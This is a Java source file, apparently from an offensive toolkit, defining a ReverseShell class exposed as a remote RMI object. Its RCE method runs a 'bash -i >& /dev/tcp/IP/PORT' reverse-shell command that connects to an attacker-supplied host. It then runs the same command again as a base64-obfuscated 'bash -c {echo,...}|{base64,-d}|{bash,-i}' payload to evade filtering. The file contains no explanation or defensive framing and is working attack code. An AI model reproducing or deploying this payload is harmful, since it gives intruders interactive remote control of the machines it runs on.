package org.example.HackObj;

import java.io.IOException;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Base64;

public class ReverseShell extends UnicastRemoteObject implements IRemoteShell {
    public static String nc_ip;
    public static String nc_port;
    public  ReverseShell(String ip,String port) throws RemoteException {
        super();
        nc_ip = ip;
        nc_port = port;
    }

    @Override
    public void RCE() throws RemoteException
    {
        try {
            String rce = "bash -i >& /dev/tcp/" + nc_ip + "/" + nc_port + " 0>&1";
            Runtime.getRuntime().exec(rce);
            String base64Rce = Base64.getEncoder().encodeToString(rce.getBytes());
            Runtime.getRuntime().exec("bash -c {echo," + base64Rce + "}|{base64,-d}|{bash,-i}");
        }catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
